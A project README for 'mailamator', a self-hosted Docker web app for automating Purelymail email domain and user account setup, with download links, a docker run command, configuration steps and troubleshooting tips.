# 🚀 mailamator - Automate Your Email Domain Setup

[![Download Mailamator](https://img.shields.io/badge/Download-Mailamator-blue)](https://github.com/slinkers99/mailamator/releases)

## 📋 Overview

mailamator is a self-hosted web app that helps you automate the setup of your Purelymail domain and user accounts. This tool is designed for ease of use, allowing you to manage email setups from your browser without needing advanced technical skills.

## 🚀 Getting Started

To get started with mailamator, follow these simple steps:

1. **Visit the Download Page:** Click the link below to access the download page for mailamator.

   [Download Mailamator](https://github.com/slinkers99/mailamator/releases)

2. **Choose the Latest Release:** On the download page, find the latest version of mailamator. You will see a list of available files.

3. **Download the Application:** Click on the file name to download it to your computer.

## 🌐 System Requirements

Before you install mailamator, make sure your system meets the following requirements:

- **Operating System:** Windows, macOS, or any Linux distribution.
- **Docker:** Ensure that Docker is installed on your system, as mailamator runs in a Docker container.
- **Disk Space:** At least 100 MB of free space.
- **Network:** An active internet connection for domain setup.

## ⚙️ Installation Steps

1. **Install Docker:**
   - Visit the [Docker website](https://www.docker.com/get-started) and follow the instructions for your operating system.

2. **Run the Downloaded File:**
   - Open your terminal or command prompt and navigate to the location where you downloaded mailamator.
   - Use the following command to run the application:
     ```
     docker run -d -p 5000:5000 slinkers99/mailamator
     ```
   - This command will start mailamator, making it accessible through your web browser.

3. **Access the Web App:**
   - Open your web browser and go to `http://localhost:5000`. You will see the mailamator interface.

## 🔧 Configuration

After launching the app, you will need to configure it to work with your Purelymail account.

1. **Domain Setup:**
   - Go to the "Domain" section of the app.
   - Enter your domain name and follow the prompts to configure your DNS settings.

2. **User Accounts:**
   - Navigate to the "Users" section.
   - Add new users by providing their email addresses and optional account settings.

3. **Final Checks:**
   - Ensure that all configurations are correct.
   - Test email functionality to confirm that everything is working as intended.

## 🔗 Additional Resources

- **Documentation:** Detailed documentation can be found in the project repository. This includes information about advanced configurations and troubleshooting tips.
- **Community Support:** Join the discussions in our community forum to ask questions and share your experiences with other users.

## 🛠️ Troubleshooting Common Issues

### Issue: Unable to Start Docker

- Ensure Docker is running on your system. Check system tray icons.
- Restart Docker and try running the application again.

### Issue: Website Not Accessible

- Verify you are using the correct URL: `http://localhost:5000`.
- Check your firewall settings to ensure there are no blocks in place.

### Issue: Email Not Sending

- Double-check the domain and user configurations. Ensure no settings are missing.

## 📥 Contact

For further assistance, you can open issues directly in the repository or reach out via community channels. Your feedback helps improve mailamator.

## 📖 Explore Further

Feel free to explore the underlying technologies used in mailamator, including Docker, Flask, and automation tools. These technologies can provide deeper insights into how mailamator functions.

Remember to check for updates periodically on the [Download Page](https://github.com/slinkers99/mailamator/releases) as new features and fixes are continuously implemented.